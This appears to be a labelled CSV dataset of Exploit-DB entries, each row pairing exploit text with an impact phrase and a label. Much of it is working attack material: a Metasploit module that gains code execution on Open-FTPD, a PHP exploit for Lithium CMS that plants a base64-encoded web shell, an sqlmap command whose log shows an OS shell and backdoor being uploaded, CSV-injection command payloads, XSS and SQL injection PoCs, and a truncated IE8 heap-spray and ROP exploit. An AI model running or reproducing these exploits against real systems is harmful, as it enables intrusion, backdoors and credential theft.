26456,"XMB Forum 1.9.3 - 'post.php' SQL Injection source: https://www.securityfocus.com/bid/15267/info  XMB Nexus Forum is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://forums.site/post.php?action=newthread&fid='[SQL]&poll=yes",exploit vulnerabilities in the underlying database implementation,1
27556,"Open-FTPD 1.2 - Arbitrary File Upload (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::Ftp         include Msf::Exploit::Remote::TcpServer         include Msf::Exploit::EXE         include Msf::Exploit::WbemExec         include Msf::Exploit::FileDropper    def initialize(info={})     super(update_info(info,       'Name'           => ""Open-FTPD 1.2 Arbitrary File Upload"",       'Description'    => %q{         This module exploits multiple vulnerabilities found in Open&Compact FTP         server. The software contains an authentication bypass vulnerability and a         arbitrary file upload vulnerability that allows a remote attacker to write         arbitrary files to the file system as long as there is at least one user         who has permission.          Code execution can be achieved by first uploading the payload to the remote         machine as an exe file, and then upload another mof file, which enables         WMI (Management Instrumentation service) to execute the uploaded payload.         Please note that this module currently only works for Windows before Vista.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Serge Gorbunov', # Initial discovery           'Brendan Coles <bcoles[at]gmail.com>', # Metasploit         ],       'References'     =>         [           ['OSVDB', '65687'],           ['EDB',   '13932'],           ['CVE',   '2010-2620']         ],       'Payload'        =>         {           'BadChars' => ""\x00"",         },       'Platform'       => 'win',       'Stance'         => Msf::Exploit::Stance::Aggressive,       'Targets'        =>         [           # Tested on version 1.2 - Windows XP SP3 (EN)           ['Open&Compact FTP 1.2 on Windows (Before Vista)', {}]         ],       'Privileged'     => true,       'DisclosureDate' => ""Jun 18 2012"",       'DefaultTarget'  => 0))      register_options([       OptString.new('PATH',  [true, 'The local Windows path', ""C:/WINDOWS/""]),       OptPort.new('SRVPORT', [true, 'The local port to listen on for active mode', 8080])     ], self.class)     deregister_options('FTPUSER', 'FTPPASS') # Using authentication bypass    end    def check     connect     disconnect      if banner =~ /\*\*        Welcome on       \*\*/       return Exploit::CheckCode::Vulnerable     else       return Exploit::CheckCode::Unknown     end   end    def on_client_connect(cli)     peer = ""#{cli.peerhost}:#{cli.peerport}""      case @stage     when :exe       print_status(""#{peer} - Sending executable (#{@exe.length.to_s} bytes)"")       cli.put(@exe)       @stage = :mof     when :mof       print_status(""#{peer} - Sending MOF (#{@mof.length.to_s} bytes)"")       cli.put(@mof)     end      cli.close   end    # Largely stolen from freefloatftp_wbem.rb   def upload(filename)     select(nil, nil, nil, 1)      peer = ""#{rhost}:#{rport}""     print_status(""#{peer} - Trying to upload #{::File.basename(filename)}"")     conn = connect(false, datastore['VERBOSE'])     if not conn       fail_with(Exploit::Failure::Unreachable, ""#{@peer} - Connection failed"")     end      # Switch to binary mode     print_status(""#{peer} - Set binary mode"")     send_cmd(['TYPE', 'I'], true, conn)      # Prepare active mode: Get attacker's IP and source port     src_ip   = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']     src_port = datastore['SRVPORT'].to_i      # Prepare active mode: Convert the IP and port for active mode     src_ip   = src_ip.gsub(/\./, ',')     src_port = ""#{src_port/256},#{src_port.remainder(256)}""      # Set to active mode     print_status(""#{peer} - Set active mode \""#{src_ip},#{src_port}\"""")     send_cmd(['PORT', ""#{src_ip},#{src_port}""], true, conn)      # Tell the FTP server to download our file     send_cmd(['STOR', filename], false, conn)      print_good(""#{peer} - Upload successful"")     disconnect(conn)   end    # Largely stolen from freefloatftp_wbem.rb   def exploit     path     = datastore['PATH']     exe_name = ""#{path}/system32/#{rand_text_alpha(rand(10)+5)}.exe""     mof_name = ""#{path}/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.mof""     @mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))     @exe      = generate_payload_exe     @stage = :exe      begin       t = framework.threads.spawn(""reqs"", false) {         # Upload our malicious executable         u = upload(exe_name)         # Upload the mof file         upload(mof_name) if u         register_file_for_cleanup(""#{::File.basename(exe_name)}"")         register_file_for_cleanup(""wbem\\mof\\good\\#{::File.basename(mof_name)}"")       }        super     ensure       t.kill     end   end  end",write arbitrary files to the file system,1
29395,EditTag 1.2 - 'mkpw.pl?plain' Cross-Site Scripting source: https://www.securityfocus.com/bid/21891/info   EditTag is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.    An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/edittag/mkpw.pl?plain=XSS,have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site,1
47279,"Adobe Acrobat Reader DC for Windows - Double Free due to Malformed JP2 Stream We have observed the following crash in the latest version of Adobe Acrobat Reader DC for Windows, when opening a malformed PDF file:  --- cut --- ======================================= VERIFIER STOP 00000007: pid 0x2C1C: Heap block already freed.   	0C441000 : Heap handle for the heap owning the block. 	147E6638 : Heap block being freed again. 	00000010 : Size of the heap block. 	00000000 : Not used   ======================================= This verifier stop is not continuable. Process will be terminated  when you use the `go' debugger command.  =======================================  (2c1c.491c): Break instruction exception - code 80000003 (first chance) eax=66e603a0 ebx=00000000 ecx=000001a1 edx=0536c661 esi=66e5dd88 edi=0c441000 eip=66e53ae6 esp=0536c948 ebp=0536cb5c iopl=0         nv up ei pl nz na po nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202 vrfcore!VerifierStopMessageEx+0x5b6: 66e53ae6 cc              int     3  0:000> kb  # ChildEBP RetAddr  Args to Child               00 0536cb5c 66e58038 66e5d258 00000007 0c441000 vrfcore!VerifierStopMessageEx+0x5b6 01 0536cb80 66d6da5e 00000007 66d61cbc 0c441000 vrfcore!VfCoreRedirectedStopMessage+0x88 02 0536cbd8 66d6b8a8 00000007 66d61cbc 0c441000 verifier!VerifierStopMessage+0x8e 03 0536cc44 66d6bdea 0c441000 00000004 147e6638 verifier!AVrfpDphReportCorruptedBlock+0x1b8 04 0536cca0 66d6c302 0c441000 147e6638 00000004 verifier!AVrfpDphCheckNormalHeapBlock+0x11a 05 0536ccc0 66d6ab43 0c441000 0c640000 01000002 verifier!AVrfpDphNormalHeapFree+0x22 06 0536cce4 77305359 0c440000 01000002 147e6638 verifier!AVrfDebugPageHeapFree+0xe3 07 0536cd54 7725ad86 147e6638 ab70558b 00000000 ntdll!RtlDebugFreeHeap+0x3c 08 0536ceb0 7725ac3d 00000000 147e6638 00000000 ntdll!RtlpFreeHeap+0xd6 09 0536cf04 66e5aad0 0c440000 00000000 147e6638 ntdll!RtlFreeHeap+0x7cd 0a 0536cf20 74a2db1b 0c440000 00000000 147e6638 vrfcore!VfCoreRtlFreeHeap+0x20 0b 0536cf34 74a2dae8 147e6638 00000000 0536cf54 ucrtbase!_free_base+0x1b 0c 0536cf44 0f012849 147e6638 16fd32f8 0536d068 ucrtbase!free+0x18 WARNING: Stack unwind information not available. Following frames may be wrong. 0d 0536cf54 0f6d6441 147e6638 31577737 0536d0b8 AcroRd32!AcroWinMainSandbox+0x6a49 0e 0536d068 0f6c20a4 0536d0d8 00000001 00000b20 AcroRd32!CTJPEGTiledContentWriter::operator=+0x18bb1 0f 0536d230 0f6bf15d 00000000 00000000 00000000 AcroRd32!CTJPEGTiledContentWriter::operator=+0x4814 10 0536d264 0f6b209f 1771f6b4 1771f6b4 194f9078 AcroRd32!CTJPEGTiledContentWriter::operator=+0x18cd 11 0536d278 0f6a5007 194f9078 000033f8 2037a088 AcroRd32!AX_PDXlateToHostEx+0x34404f 12 0536d32c 0f0a57c9 1771f6b4 19053d28 0f0a5730 AcroRd32!AX_PDXlateToHostEx+0x336fb7 13 0536d350 0f0a56c3 1cb80970 00000001 0013d690 AcroRd32!DllCanUnloadNow+0x4c809 14 0536d370 0f02e7e1 0536d390 1cb80970 0013d690 AcroRd32!DllCanUnloadNow+0x4c703 15 0536d398 0f02e78d 1cb80970 00000001 0013d690 AcroRd32!AcroWinMainSandbox+0x229e1 16 0536d3ac 0f0e8a5b 1cb80970 00000001 0013d690 AcroRd32!AcroWinMainSandbox+0x2298d 17 0536d3c8 0f1f4315 1cb80970 00000001 0013d690 AcroRd32!DllCanUnloadNow+0x8fa9b 18 0536d42c 0f6568a8 00000000 00000e44 205378ac AcroRd32!CTJPEGDecoderHasMoreTiles+0x1a15 19 0536d4ac 0f56ae8d 0536d4cc 0536d4dc 315773af AcroRd32!AX_PDXlateToHostEx+0x2e8858 1a 0536d4f0 10d5da8c 17b908d0 0536d55c bb3e57b9 AcroRd32!AX_PDXlateToHostEx+0x1fce3d 1b 0536d56c 10d5e053 0536d5b8 bb3e5771 00000000 AGM!AGMGetVersion+0x16e3c 1c 0536d5a4 10fffb4c 193d706c 0536d5b8 fffffff9 AGM!AGMGetVersion+0x17403 1d 0536d5bc 10cd9a32 0536d650 bb3e5855 17c76ff8 AGM!AGMGetVersion+0x2b8efc 1e 0536da80 10cd75d6 0536df90 17c76ff8 0536df04 AGM!AGMInitialize+0x40c02 1f 0536df24 10cd4133 0536df90 17c76ff8 0536e124 AGM!AGMInitialize+0x3e7a6 20 0536e144 10cd2370 19891678 18f911e8 17c616f8 AGM!AGMInitialize+0x3b303 21 0536e320 10cd0dec 19891678 18f911e8 bb3e61b9 AGM!AGMInitialize+0x39540 22 0536e36c 10cfffbf 19891678 18f911e8 17150de0 AGM!AGMInitialize+0x37fbc 23 0536e398 10cffb7f 18f911e8 bb3e66d1 17150de0 AGM!AGMInitialize+0x6718f 24 00000000 00000000 00000000 00000000 00000000 AGM!AGMInitialize+0x66d4f  0:000> !heap -p -a 147E6638      address 147e6638 found in     _HEAP @ c640000       HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state         147e6610 0009 0000  [00]   147e6638    00010 - (free DelayedFree)         66d6c396 verifier!AVrfpDphNormalHeapFree+0x000000b6         66d6ab43 verifier!AVrfDebugPageHeapFree+0x000000e3         77305359 ntdll!RtlDebugFreeHeap+0x0000003c         7725ad86 ntdll!RtlpFreeHeap+0x000000d6         7725ac3d ntdll!RtlFreeHeap+0x000007cd         66e5aad0 vrfcore!VfCoreRtlFreeHeap+0x00000020         74a2db1b ucrtbase!_free_base+0x0000001b         74a2dae8 ucrtbase!free+0x00000018         f012849 AcroRd32!AcroWinMainSandbox+0x00006a49         f6d6430 AcroRd32!CTJPEGTiledContentWriter::operator=+0x00018ba0         f6c20a4 AcroRd32!CTJPEGTiledContentWriter::operator=+0x00004814         f6bf15d AcroRd32!CTJPEGTiledContentWriter::operator=+0x000018cd         f6b209f AcroRd32!AX_PDXlateToHostEx+0x0034404f         f6a5007 AcroRd32!AX_PDXlateToHostEx+0x00336fb7         f0a57c9 AcroRd32!DllCanUnloadNow+0x0004c809         f0a56c3 AcroRd32!DllCanUnloadNow+0x0004c703         f02e7e1 AcroRd32!AcroWinMainSandbox+0x000229e1         f02e78d AcroRd32!AcroWinMainSandbox+0x0002298d         f0e8a5b AcroRd32!DllCanUnloadNow+0x0008fa9b         f1f4315 AcroRd32!CTJPEGDecoderHasMoreTiles+0x00001a15         f6568a8 AcroRd32!AX_PDXlateToHostEx+0x002e8858         f56ae8d AcroRd32!AX_PDXlateToHostEx+0x001fce3d         10d5da8c AGM!AGMGetVersion+0x00016e3c         10d5e053 AGM!AGMGetVersion+0x00017403         10fffb4c AGM!AGMGetVersion+0x002b8efc         10cd9a32 AGM!AGMInitialize+0x00040c02         10cd75d6 AGM!AGMInitialize+0x0003e7a6         10cd4133 AGM!AGMInitialize+0x0003b303         10cd2370 AGM!AGMInitialize+0x00039540         10cd0dec AGM!AGMInitialize+0x00037fbc         10cfffbf AGM!AGMInitialize+0x0006718f --- cut ---  Notes:  - Reproduces on Adobe Acrobat Reader DC (2019.012.20035) on Windows 10, with the PageHeap option enabled in Application Verifier.  - The crash occurs immediately after opening the PDF document.  - Attached samples: poc.pdf (crashing file), original.pdf (original file).  - We have minimized the difference between the original and mutated files down to a single byte at offset 0x172b4, which appears to reside inside a binary JP2 image stream. It was modified from 0x1C to 0xFF.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47279.zip",denial of service,1
36937,"PHPMyVisites 2.4 - 'PHPmv2/index.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/52377/info  phpMyVisites is prone to multiple cross-site scripting vulnerabilities because it fails to sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.  phpMyVisites 2.4 is vulnerable; other versions may also be affected.   <html> <head> <title>Warning! This is Proof Of Concept Exploit for phpMyVisites 2.4 (version.php 238 2009-12-16 19:48:15Z matthieu_ $)</title> </head> <h1> Warning! This is a Proof Of Concept Exploit for phpMyVisites 2.4:<br/></h1> <p>// $Id: version.php 238 2009-12-16 19:48:15Z matthieu_ $ PHPMV_VERSION 2.4 </p> </h1> <body onload=""javascript:document.forms[0].submit()"">  <form action=""http://CHANGE_TO_RTARGET/phpmv2/index.php?mod=install_database_setup"" method=""post"" name=""form_phpmv"" id=""form_phpmv""> <input value=""<script>alert(document.cookie);</script>"" name=""form_dblogin"" type=""hidden"" /> <input value=""<script>alert(document.cookie);</script>"" name=""form_dbpassword"" type=""hidden"" /> <input value=""<script>alert(document.cookie);</script>"" name=""form_dbhost"" type=""hidden"" /> <input value=""<script>alert(document.cookie);</script>"" name=""form_dbname"" type=""hidden"" /> <input value=""<script>alert(document.cookie);</script>"" name=""form_dbprefix"" type=""hidden""/></td>  <!--- Author: AkaStep --> </form> </body> </html>",execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
43806,"Invision Power Top Site List < 1.1 RC 2 - SQL Injection Invision Power Top Site List SQL Injection  Vendor: Invision Power Services Product: Invision Power Top Site List Version: <= 1.1 RC 2 Website: http://www.invisiontsl.com/  BID: 9945   Description: Invision Power Top Site List is a flexible site ranking script written in PHP, the popular programming choice for web developers. Featuring an impressive feature set with a user-friendly interface your community will feel at home using the system.   SQL Injection Vulnerability: Invision Power Top Site List is prone to an SQL Injection vuln in its ""comment"" feature. This issue is very much exploitable as the injection happens right in the middle of a WHERE statement. Lets have a look at an example error message to get a better idea of what is going on.   Error: Error executing query  The software returned the following error:  You have an error in your SQL syntax. Check the manual that  corresponds to your MySQL server version for the right syntax  to use near '[ Evil_Query ]' at line 1  Query Executed: SELECT * FROM tsl_sites WHERE id = [Evil_Query]  As we can see from this it would be of little difficulty for any attacker to execute arbitrary requests. For example pulling the admin hash and/or possibly taking admin control over an affected Invision Power Top Site List. Below is an example url to show how the issue could be exploited.   index.php?act=comments&id=[Evil_Query]   Solution: The Invision Power Services team were contacted immediately and hopefully a fix will be available soon since this is an application that cost users money to use.   Credits: James Bercegay of the GulfTech Security Research Team.",code execution,1
48122,"eLection 2.0 - 'id' SQL Injection # Title: eLection 2.0 - 'id' SQL Injection # Date: 2020-02-21 # Exploit Author: J3rryBl4nks # Vendor Homepage: https://sourceforge.net/projects/election-by-tripath/ # Software Link: https://sourceforge.net/projects/election-by-tripath/files/#Version 2.0 # Tested on Ubuntu 19/Kali Rolling  # The eLection Web application is vulnerable to authenticated SQL Injection which leads to remote code execution: # Login to the admin portal and browse to the candidates section. Capture the request in BurpSuite and save it to file:  POST /election/admin/ajax/op_kandidat.php HTTP/1.1 Host: HOSTNAME User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://HOSTNAME/election/admin/kandidat.php?_ Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 17 Connection: close Cookie: el_listing_panitia=5; el_mass_adding=false; el_listing_guru=5; el_listing_siswa=5; PHPSESSID=b4f0c3bbccd80e9d55fbe0269a29f96a; el_lang=en-us  aksi=fetch&id=256    Send the request to SQLMap with the following parameters:      sqlmap -r getcandidate --level=5 --risk=3 --os-shell -p id   SQLMap will find the injection:      ---     Parameter: id (POST)         Type: boolean-based blind         Title: AND boolean-based blind - WHERE or HAVING clause         Payload: aksi=fetch&id=256 AND 8584=8584          Type: time-based blind         Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)         Payload: aksi=fetch&id=256 AND (SELECT 8551 FROM (SELECT(SLEEP(5)))nYfJ)          Type: UNION query         Title: Generic UNION query (NULL) - 5 columns         Payload: aksi=fetch&id=-9798 UNION ALL SELECT NULL,NULL,CONCAT(0x7170707171,0x676d755461434e486f49475051707357694861534e664f416f434269487042545a76454f5843584b,0x71717a7871),NULL,NULL-- dWMc     ---       [09:39:07] [WARNING] unable to automatically parse any web server path     [09:39:07] [INFO] trying to upload the file stager on '/opt/lampp/htdocs/election/' via LIMIT 'LINES TERMINATED BY' method     [09:39:07] [INFO] the file stager has been successfully uploaded on '/opt/lampp/htdocs/election/' - http://HOSTNAME/election/tmpumlfm.php     [09:39:07] [INFO] the backdoor has been successfully uploaded on '/opt/lampp/htdocs/election/' - http://HOSTNAME/election/tmpbpfkq.php     [09:39:07] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER     os-shell>   Due to the way the setup of the application requires you to change permissions on the directory of the web app, you should be able to get a shell.  https://github.com/J3rryBl4nks/eLection-TriPath-/blob/master/SQLiIntoRCE.md",remote code execution,1
45234,"WordPress Plugin Ninja Forms 3.3.13 - CSV Injection # Exploit Title: Wordpress Plugin Ninja Forms 3.3.13 - CSV Injection # Exploit Author: Mostafa Gharzi # Website: https://www.certcc.ir # Date: 2018-08-19 # Google Dork: N/A # Vendor: The WP Ninjas # Software Link: https://wordpress.org/plugins/ninja-forms/ # Affected Version: 3.3.13 and before # Active installations: 1+ million # Patched Version: unpatched # Category: Web Application # Platform: PHP # Tested on: Win10x64 & Kali Linux  # 1. Technical Description: # WordPress Ninja Forms plugin version 3.3.13 and before are affected by Remote Code Execution # through the CSV injection vulnerability. This allows an application user # to inject commands as part of the fields of forms and these commands are executed when a user with # greater privilege exports the data in CSV and opens that file on his machine.  # 2. Proof Of Concept (PoC): # Enter the payload =SUM(1+1)*cmd|' /C calc'!A0 in any field of the form, # for example, in name field. # When the user with high privileges logs in to the application, export # data in CSV and opens the # generated file, the command is executed and the calculator will run open # on the machine.  # 3. Payloads: =SUM(1+1)*cmd|' /C calc'!A0 +SUM(1+1)*cmd|' /C calc'!A0 -SUM(1+1)*cmd|' /C calc'!A0 @SUM(1+1)*cmd|' /C calc'!A0",Code Execution,1
29688,EmbeddedWB Web Browser ActiveX Control - Remote Code Execution source: https://www.securityfocus.com/bid/22755/info  EmbeddedWB Web Browser ActiveX control is prone to a remote code-execution vulnerability.  Exploiting this issue allows remote attackers to execute arbitrary machine code in the context of applications using the affected ActiveX control and possibly to compromise affected computers.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/29688.ocx,code-execution,1
46923,"Cyberoam SSLVPN Client 1.3.1.30 - 'Connect To Server' Denial of Service (PoC) #Exploit Title: Cyberoam SSLVPN Client 1.3.1.30 - 'Connect To Server' Denial of Service (PoC) #Discovery by: Victor Mondragón #Discovery Date: 2019-05-23 #Vendor Homepage: https://www.cyberoam.com #Software Link: https://download.cyberoam.com/solution/optionals/i18n/CrSSL_v1.3.1.30.zip #Tested Version: 1.3.1.30 #Tested on: Windows Windows 10 Single Language x64 / Windows 7 Service Pack 1 x64  #Steps to produce the crash: #1.- Run python code: c_sslvpn_cts.py #2.- Open c_sslvpn_cts.txt and copy content to clipboard #3.- Open Cyberoam SSLVPN Client #4.- Select Server Settings  #5.- In ""Connect To Server"" field paste Clipboard #6.- In ""Port"" type 80 #7.- Select ""OK"" #8.- Crashed!   cod = ""\x41"" * 5000  f = open('c_sslvpn_cts.txt', 'w') f.write(cod) f.close()",crash,1
2702,"Lithium CMS 4.04c - '/classes/index.php' Local File Inclusion <?  print	    - - [DEVIL TEAM THE BEST POLISH TEAM] - -   Lithium CMS <= 4.04c Remote Code Execution Exploit  [Script name: Lithium 4.04c [Script site: https://sourceforge.net/projects/lit/  Find by: Kacper (a.k.a Rahim)   ========>  DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam  <========    Contact: kacper1964@yahoo.pl  or  http://www.rahim.webd.pl/   (c)od3d by Kacper -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon  TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios,  mIvus, nukedclx, SkD, wacky, xoron -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-                  Greetings for 4ll Fusi0n Group members ;-)  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ';  if ($argc<5) { print_r(' ----------------------------------------------------------------------------- Usage: php '.$argv[0].' host path comments_id cmd OPTIONS host:      target server (ip/hostname) path:      Lithium path comments_id:      number of news what is in site cmd:       a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' 2.2.2.2 /Lithium/ 2006.10.30 ls -la -P1.1.1.1:80 php '.$argv[0].' 1.1.1.1 /  -p81 ----------------------------------------------------------------------------- ');  die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacket($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $comments_id=$argv[3]; $cmd="""";  $port=80; $proxy=""""; for ($i=4; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;} $hauru = base64_decode(""PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuLi5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyBUbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2VjaG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvIjtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYXNzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+""); $data.='-----------------------------7d6224c08dc Content-Disposition: form-data; name=""name""  Hauru -----------------------------7d6224c08dc Content-Disposition: form-data; name=""www""  http://www.rahim.webd.pl/ -----------------------------7d6224c08dc Content-Disposition: form-data; name=""text""  '.$hauru.' -----------------------------7d6224c08dc Content-Disposition: form-data; name=""new_comment""  Add comment -----------------------------7d6224c08dc-- ';   echo ""creat hauru...\n""; $packet =""POST "".$p.""news/comment.php/"".$comments_id."" HTTP/1.0\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacket($packet); sleep(1);  echo ""remote code execution...\n""; $packet =""GET "".$p.""classes/index.php?siteconf[curl]=../../../db/comments/news/"".$comments_id.""%00 HTTP/1.1\r\n""; $packet.=""HAURU: "".$cmd.""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacket($packet); if (strstr($html,""Hauru"")) { $temp=explode(""Hauru"",$html); die($temp[1]); } echo ""Exploit err0r :(""; echo ""Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam""; ?>  # milw0rm.com [2006-11-02]",Code Execution,1
27412,QwikiWiki 1.4/1.5 - 'recentchanges.php?help' Cross-Site Scripting source: https://www.securityfocus.com/bid/17064/info     QwikiWiki is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.      An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/recentchanges.php?nothing=nothing&help=[XSS],have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
24017,"Microsoft Internet Explorer 8 - Fixed Col Span ID (Full ASLR + DEP Bypass) (MS12-037) <!-- ** Exploit Title: Internet Explorer 8 Fixed Col Span ID full ASLR & DEP bypass ** Author: sickness@offsec.com ** Thanks to Ryujin, Dookie and mr_me :) for their help.  ####################################################################  ** Affected Software: Internet Explorer 8 ** Vulnerability: Fixed Col Span ID ** CVE: CVE-2012-1876 ** Metasploit exploit using NON-ASLR DLL: http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/windows/browser/ms12_037_ie_colspan.rb ** Vupen Blog post: http://www.vupen.com/blog/20120710.Advanced_Exploitation_of_Internet_Explorer_HeapOv_CVE-2012-1876.php ** Tested on Windows 7 (x86) - IE 8.0.7601.17514 ** Old version of the exploit available at: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/24017-old.zip  ####################################################################  ** The exploit bypasses ASLR without the need of any NON-ASLR dll's using a leak :) ** To get it working on a different version of Windows you will require to make your own chances to the exploit :) ** Have fun :) -->  <html> <body> <div id=""evil""></div> <table style=""table-layout:fixed"" ><col id=""132"" width=""41"" span=""9"" >  </col></table> <script language='javascript'>  function strtoint(str) {         return str.charCodeAt(1)*0x10000 + str.charCodeAt(0); }  var free = ""EEEE""; while ( free.length < 500 ) free += free;  var string1 = ""AAAA""; while ( string1.length < 500 ) string1 += string1;  var string2 = ""BBBB""; while ( string2.length < 500 ) string2 += string2;  var fr = new Array(); var al = new Array(); var bl = new Array();  var div_container = document.getElementById(""evil""); div_container.style.cssText = ""display:none"";  for (var i=0; i < 500; i+=2) {         fr[i] = free.substring(0, (0x100-6)/2);         al[i] = string1.substring(0, (0x100-6)/2);         bl[i] = string2.substring(0, (0x100-6)/2);         var obj = document.createElement(""button"");         div_container.appendChild(obj); }  for (var i=200; i<500; i+=2 ) {         fr[i] = null;         CollectGarbage(); }  function heapspray(cbuttonlayout) {     CollectGarbage();     var rop = cbuttonlayout + 4161; // RET     var rop = rop.toString(16);     var rop1 = rop.substring(4,8);     var rop2 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 11360; // POP EBP     var rop = rop.toString(16);     var rop3 = rop.substring(4,8);     var rop4 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 111675; // XCHG EAX,ESP     var rop = rop.toString(16);     var rop5 = rop.substring(4,8);     var rop6 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 12377; // POP EBX     var rop = rop.toString(16);     var rop7 = rop.substring(4,8);     var rop8 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 642768; // POP EDX     var rop = rop.toString(16);     var rop9 = rop.substring(4,8);     var rop10 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 12201; // POP ECX --> Changed     var rop = rop.toString(16);     var rop11 = rop.substring(4,8);     var rop12 = rop.substring(0,4); // } RET      var rop = cbuttonlayout + 5504544; // Writable location     var rop = 